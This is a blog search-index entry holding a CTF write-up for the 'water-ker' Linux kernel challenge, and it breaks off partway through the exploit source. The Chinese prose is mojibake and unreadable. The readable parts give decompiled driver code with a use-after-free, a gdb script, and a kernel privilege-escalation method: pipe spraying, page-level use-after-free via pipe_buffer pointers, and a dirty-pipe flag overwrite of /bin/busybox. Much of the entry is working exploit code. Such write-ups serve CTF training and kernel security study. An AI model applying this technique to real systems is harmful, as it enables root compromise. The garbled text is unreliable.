<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>mimic water-ker</title>
      <link href="/2023/11/11/mimic%20water-ker/"/>
      <url>/2023/11/11/mimic%20water-ker/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å·®ç‚¹æŠ„æ˜ç™½äº†</p></blockquote><span id="more"></span><h2 id="water-ker"><a href="#water-ker" class="headerlink" title="water-ker"></a>water-ker</h2><p>å†…æ ¸é¢˜ç›®ï¼Œæƒé™æ­£ç¡®ï¼Œä¿æŠ¤å…¨å¼€ï¼Œå”¯ä¸€ä¸å¥½çš„å°±æ˜¯æ²¡æœ‰æä¾› <code>.config</code> æ–‡ä»¶</p><p>è¿è¡Œæ—¶ä¿æŠ¤å…¨å¼€ï¼ŒæŸ¥çœ‹ LKM</p><ul><li>åˆ›å»ºä¸€ä¸ªchunkã€‚</li><li>å¯ä»¥freeï¼Œå¹¶ä¸”å­˜åœ¨UAFã€‚</li><li>å¯ä»¥ edit 1å­—èŠ‚ã€‚</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">water_ioctl</span><span class="params">(file *file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> __int64 arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbp</span></span><br><span class="line">  __int64 arg_; <span class="comment">// rdx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  edit_args args; <span class="comment">// [rsp+0h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+10h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  v8 = v3;</span><br><span class="line">  v7 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  result = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">switch</span> ( cmd )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x30</span>u:</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">copy_from_user</span>(&amp;args, arg_, <span class="number">8LL</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( delete_idx &lt;= <span class="number">0</span> &amp;&amp; chunk )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">kfree</span>();                              <span class="comment">// uaf dangling pointer</span></span><br><span class="line">                                                <span class="comment">// chunk = 0</span></span><br><span class="line">          ++delete_idx;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x50</span>u:</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">copy_from_user</span>(&amp;args, arg_, <span class="number">8LL</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( edit_idx &lt;= <span class="number">0</span> &amp;&amp; chunk &amp;&amp; !<span class="built_in">copy_from_user</span>(chunk, args.buf, <span class="number">1LL</span>) )<span class="comment">// pipe pages</span></span><br><span class="line">        &#123;</span><br><span class="line">          ++edit_idx;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x20</span>u:</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">copy_from_user</span>(&amp;args, arg_, <span class="number">8LL</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !chunk )</span><br><span class="line">        &#123;                                       <span class="comment">// void *kmalloc_trace(struct kmem_cache *s, gfp_t flags, size_t size)</span></span><br><span class="line">          chunk = (<span class="type">unsigned</span> __int8 *)<span class="built_in">kmalloc_trace</span>(kmalloc_caches[<span class="number">51</span>], <span class="number">4197568LL</span>, <span class="number">0x200</span>LL);</span><br><span class="line">          <span class="keyword">if</span> ( chunk )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">copy_from_user</span>(chunk, args.buf, <span class="number">0x200</span>LL);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>chunkçš„flagï¼Œä¸æ˜¯ <code>SLAB_ACCOUNT 0x04000000</code>ï¼Œå› æ­¤æ˜¯ é€šç”¨slabã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk = (<span class="type">unsigned</span> __int8 *)<span class="built_in">kmalloc_trace</span>(kmalloc_caches[<span class="number">51</span>], <span class="number">0x400CC0</span>LL, <span class="number">0x200</span>LL);</span><br></pre></td></tr></table></figure><p>æ€è·¯æ˜¯ä½¿ç”¨ pipe ç»“æ„ä½“çš„ page æŒ‡é’ˆï¼Œé€ æˆä»»æ„è¯»å†™ã€‚</p><ul><li>fcntl ä¿®æ”¹ pipe çš„sizeä»è€Œå¯ä»¥è·å¾—0x200å¤§å°çš„ <code>pipe_bufs ring</code></li><li>uaf ä¿®æ”¹ <code>pipe_buffer-&gt;pages</code> ä½¿ä¸¤ä¸ªpageæŒ‡é’ˆæŒ‡å‘åŒä¸€ä¸ªå†…å­˜</li><li>free ä¸€ä¸ª page å¯ä»¥ä½¿ç”¨å¦ä¸€ä¸ªpageä»»æ„è¯»å†™</li><li>å †å–·å°„æé«˜æˆåŠŸç‡</li><li>page ä½¿ç”¨kmalloc-64ã€‚0x40</li></ul><p>gdbè°ƒè¯•ï¼Œä½¿ç”¨è„šæœ¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># gdbscript</span><br><span class="line">file vmlinux  # éœ€è¦å…ˆå»é™¤ kaslr å¦åˆ™åœ°å€åç§»ä¸å¯¹ï¼Œæ— æ³•debug</span><br><span class="line">target remote :1234</span><br><span class="line"></span><br><span class="line"># cmd</span><br><span class="line">gdb -x gdbscript</span><br></pre></td></tr></table></figure><h3 id="page-level-uaf"><a href="#page-level-uaf" class="headerlink" title="page-level-uaf"></a>page-level-uaf</h3><p>pipe ç»“æ„ä½“<code>struct pipe_inode_info (size ?= 0x88)</code> æˆå‘˜ <code>pipe-&gt;bufs</code>  çš„æˆå‘˜é»˜è®¤ä¸º 10(pipe_bufs &amp;&amp; ring_size)ä¸ª <code>struct pipe_buffer</code> ï¼Œæ­¤ç»“æ„ä½“ç¬¬ä¸€ä¸ªæˆå‘˜å˜é‡ä¸º <code>struct page *page</code></p><ul><li>å †å–·å°„å¤§é‡çš„pipeï¼Œç„¶åä½¿ç”¨ <code>pipe_fcntl</code> ä¿®æ”¹  <code>ring_size</code>  çš„å¤§å°ï¼Œè®© <code>pipe-&gt;bufs</code> å¤„äº kmalloc-512ã€‚</li><li>å°†éƒ¨åˆ†çš„ <code>pipe_bufs</code> ä¿®æ”¹å¤§ï¼Œè¿™æ ·ä¼šè·å¾—æ¯”è¾ƒå¤šçš„ free æ‰çš„ kmalloc-512</li><li>æ·»åŠ chunkç„¶åfreeæ‰ï¼Œå¤„äºkmalloc-512ã€‚</li><li>ä½¿ç”¨<code>fcntl</code> å°†æ”¹å¤§çš„ <code>pipe_bufs</code> æ”¹å› kmalloc-512ã€‚</li><li>å¾€pipeä¸­å†™å†…å®¹ï¼Œ<code>alloc_pages</code> è·å¾—é¡µã€‚</li><li>å› ä¸ºå­˜åœ¨uafï¼Œedit ä¿®æ”¹pageæŒ‡é’ˆçš„æœ€åä¸€ä¸ªå­—èŠ‚ï¼Œä½¿ä¸¤ä¸ª pipe ï¼ˆvictim, originï¼‰ æŒ‡å‘ç›¸åŒçš„ struct page</li><li><code>struct page</code> çš„å¤§å°çº¦ä¸º 0x40ï¼Œç›´æ¥ä¿®æ”¹ <code>\x00</code> æˆåŠŸç‡ <code>75%</code>ã€‚0x100 &#x2F; 0x40 &#x3D; 4ï¼Œå¯èƒ½æ ¹æœ¬å°±æ²¡ä¿®æ”¹ï¼Œå­˜åœ¨å¤±è´¥çš„å¯èƒ½æ€§ã€‚</li></ul><p>å¦‚æœæˆ‘ä»¬ close origin pipe ï¼Œå¯ä»¥è·å¾— uaf çš„ page</p><h3 id="äºŒçº§-page-level-uaf-æ„é€ è‡ªå†™ç®¡é“"><a href="#äºŒçº§-page-level-uaf-æ„é€ è‡ªå†™ç®¡é“" class="headerlink" title="äºŒçº§ page-level-uaf æ„é€ è‡ªå†™ç®¡é“"></a>äºŒçº§ page-level-uaf æ„é€ è‡ªå†™ç®¡é“</h3><p>ä¸Šä¸€æ­¥closeåï¼Œå­˜åœ¨ä¸€ä¸ªå­˜åœ¨ uaf çš„ pageï¼Œæˆ‘ä»¬å‡ ä¹å¯ä»¥ä»»æ„è¯»å†™ã€‚è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç»§ç»­ä½¿ç”¨ <code>pipe_buffer</code> ç»“æ„ä½“ï¼Œåœ¨close pipeã€‚</p><ul><li>å †å–·å¤§é‡çš„ pipe</li><li>close origin pipeï¼Œè·å¾— free page 1</li><li>fcntl ä¿®æ”¹å¤§å°ï¼Œæ€»æœ‰åœ¨free page 1 çš„ pipeï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ victim è¯»å–å†…å®¹ï¼Œè·å¾—page 1ä¸Šçš„pipeå†…å®¹</li><li>ç„¶åå¯¹ free page 1ä¸Šçš„ pipe_buffer è¿›è¡Œ ç±»ä¼¼ uaf å†™ä¸€å­—èŠ‚çš„æ•ˆæœï¼Œä½¿ page 1 çš„ä¸¤ä¸ª pipe_buffer çš„ page æŒ‡å‘åŒä¸€ä¸ªåœ°æ–¹</li><li>free page 1 çš„å…¶ä¸­ä¸€ä¸ª pipeï¼Œè·å¾—ä¸€ä¸ª uaf çš„ free page 2</li><li>ä½¿ç”¨ pipe_buffer è¿›è¡Œè·å–ï¼Œè¿›è¡Œè¯»å†™ï¼Œä½†æ˜¯è¿™é‡Œä¿®æ”¹free page 2 pipe_buffer pageæŒ‡é’ˆä¸º  free page 1 çš„pipe_buffer çš„ pageã€‚</li></ul><p>æ¥è‡ªa3âœŒåšå®¢çš„åŸå›¾ã€‚</p><p><img src="https://s2.loli.net/2023/05/02/TYr8WlEushem2i3.png" alt="äºŒçº§è‡ªå†™ç®¡é“"></p><h3 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h3><p>è¯»å†™ç®¡é“å†…å®¹ï¼šéœ€è¦å…ˆå¾€ç®¡é“ä¸­å†™å†…å®¹ï¼Œæ‰èƒ½è¯»å–ç®¡é“å†…å®¹ã€‚è¿™æ˜¯ <code>struct pipe_buffer</code> æœ¬èº«çš„å±æ€§  <code>offset &amp; len</code> å†³å®šçš„ã€‚</p><ul><li>offset å¼€å§‹è¯»å–ï¼Œæœ€å¤šè¯»lené•¿åº¦</li><li>ä» offset + len åœ°æ–¹å¼€å§‹å†™å†…å®¹</li></ul><p>ä¸ºä»€ä¹ˆé€‰æ‹© 96 å’Œ 192 çš„ size</p><ul><li>kmallocå­˜åœ¨è¿™ä¸¤ä¸ªå¤§å°çš„ kmem_cacheã€‚</li><li>è¿™ä¸¤ä¸ªsizeåœ¨ kmalloc ä¸­ä¹Ÿæ˜¯æ¯”è¾ƒç‹¬ç‰¹çš„å­˜åœ¨ï¼Œä¸æ˜¯2çš„å¹‚æ¬¡æ–¹ï¼Œä½†æ˜¯å†…æ ¸ä¸­å¾ˆå¤šçš„ç»“æ„ä½“å¤§å°ç±»ä¼¼ï¼Œå› æ­¤ä¸“é—¨å­˜åœ¨è¿™ä¸¤ä¸ªsize</li></ul><p>kfree æ²¡æœ‰sizeå‚æ•°ï¼Ÿå…ˆæ‰¾page ç»“æ„ä½“ï¼Œä¸æ˜¯ slab page å°±é‡Šæ”¾ pageï¼Œæ˜¯slab page é‡Šæ”¾ object å¤§å°çš„å†…å®¹</p><h4 id="pipe-primitive"><a href="#pipe-primitive" class="headerlink" title="pipe primitive"></a>pipe primitive</h4><p>dirty pipe ï¼Œå¤§è‡´å°±æ˜¯ <code>struct pipe_buffer</code> çš„ flag å­˜åœ¨ä¸€ä¸ªå±æ€§ï¼š <code>PIPE_BUF_FLAG_CAN_MERGE</code> ï¼Œç»“åˆ <code>splice</code> 0æ‹·è´ï¼Œå¯ä»¥å†™å…¥<strong>ä»»æ„å¯è¯»æ–‡ä»¶</strong>ã€‚</p><p>æˆ‘ä»¬ä¸»è¦æ€è·¯å°±æ˜¯ï¼šæ”¹pipeçš„flagï¼Œå®ç°ä¸ä¾èµ–åœ°å€çš„å†…æ ¸ææƒã€‚</p><p>åœ¨å†…æ ¸ææƒè¿‡ç¨‹ä¸­ï¼Œè¦†ç›– <code>/bin/busybox</code> æ–‡ä»¶ï¼Œå¯ä»¥å†™äºŒçº§åˆ¶shellcode æˆ–è€… bash è„šæœ¬ï¼Œéšä¾¿æ‰§è¡Œå‘½ä»¤å°±è¡Œï¼Œå› ä¸ºéƒ½æ˜¯ busybox çš„ linkã€‚</p><ul><li>é—®é¢˜ï¼šå¦‚æœshellå†™æˆ <code>/bin/cat /flag</code> ï¼Œå› ä¸ºæˆ‘ä»¬æ”¹äº†busyboxå®ç°ï¼Œä¼šå‡ºç° <code>Too many levels of symbolic links</code> çš„é”™è¯¯æç¤º</li><li>åˆ«å¿˜è®°å…³é—­æ–‡ä»¶æè¿°ç¬¦ğŸ¤£ã€‚</li><li>è¿˜æœ‰çš„é—®é¢˜å°±å†™åœ¨æ³¨é‡Šé‡Œäº†</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * musl-gcc water.c -static -masm=intel -o exp</span></span><br><span class="line"><span class="comment"> * strip exp</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_SPRAY_NUMS 120</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SND_PIPE_SPRAY_NUMS 80</span></span><br><span class="line"><span class="comment">// kmalloc-cg-96</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SND_PIPE_BUFS_SIZE 96</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_BUF_FLAG_CAN_MERGE 0x10</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_info(fmt, ...) \</span></span><br><span class="line"><span class="meta">  dprintf(2, <span class="string">&quot;\033[32m[+] &quot;</span> fmt <span class="string">&quot;\033[0m\n&quot;</span>, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">page</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_inode_info</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_buf_operations</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_buffer</span> &#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">page</span> *page;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line">  <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">pipe_buf_operations</span> *ops;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_buf_operations</span> &#123;</span><br><span class="line">  <span class="built_in">int</span> (*confirm)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">  <span class="built_in">void</span> (*release)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">  <span class="built_in">int</span> (*try_steal)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">  <span class="built_in">int</span> (*get)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> kernel_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="type">size_t</span> kernel_offset = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> spray_pipe_fd[PIPE_SPRAY_NUMS][<span class="number">2</span>];</span><br><span class="line"><span class="type">int</span> dev_fd;</span><br><span class="line"><span class="type">int</span> victim_idx = <span class="number">-1</span>, origin_idx = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> target_file[] = <span class="string">&quot;/bin/busybox&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> payload[] = <span class="string">&quot;#!/tmp/sh\n /tmp/cat /flag\n&quot;</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_buffer</span> info_pipe_buf = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">water_args</span> &#123;</span><br><span class="line">  <span class="type">char</span> *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">new_chunk</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">char</span> buffer[<span class="number">512</span>];</span><br><span class="line">  <span class="built_in">memset</span>(buffer, <span class="number">0x44</span>, <span class="built_in">sizeof</span>(buffer));</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">water_args</span> arg = &#123;</span><br><span class="line">      .buf = buffer,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">ioctl</span>(dev_fd, <span class="number">0x20</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">delete_chunk</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">water_args</span> arg = &#123;</span><br><span class="line">      .buf = <span class="literal">NULL</span>,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">ioctl</span>(dev_fd, <span class="number">0x30</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">edit_chunk</span><span class="params">(<span class="type">char</span> c)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">water_args</span> arg = &#123;</span><br><span class="line">      .buf = &amp;c,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">ioctl</span>(dev_fd, <span class="number">0x50</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[-] error: %s&quot;</span>, msg);</span><br><span class="line">  <span class="built_in">sleep</span>(<span class="number">5</span>);</span><br><span class="line">  <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">debug</span><span class="params">(<span class="type">char</span> *msg)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(msg);</span><br><span class="line">  <span class="built_in">getchar</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">page_level_uaf</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;spray pipe&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; ++i) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">pipe</span>(spray_pipe_fd[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">err_exit</span>(<span class="string">&quot;pipe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;change ring_size make pipe-&gt;bufs kmalloc-512 &quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i ++) &#123;</span><br><span class="line">    <span class="built_in">fcntl</span>(spray_pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">8</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;kmalloc-512 hole&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i += <span class="number">2</span>) &#123;</span><br><span class="line">    <span 